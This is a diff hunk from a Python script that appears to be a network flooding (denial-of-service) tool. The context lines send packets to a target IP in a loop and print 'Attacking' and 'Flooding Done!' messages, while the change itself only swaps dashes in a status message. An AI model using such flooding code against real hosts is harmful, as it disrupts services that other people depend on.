@@ -75,7 +75,7 @@ def start():
       for i in range(packs):
         s.send(r)
         u += 1
-        print("\033[92m[\033[97m+\033[92m]\033[92mSent: " +str(u)+ " \033[94m<-- Attacking " +ip+ " -->" )
+        print("\033[92m[\033[97m+\033[92m]\033[92mSent: " +str(u)+ " \033[94m<— Attacking " +ip+ " —>" )
     except:
       s.close()
       print("\033[97m[\033[91m-\033[97m]\033[91mFlooding Done!")
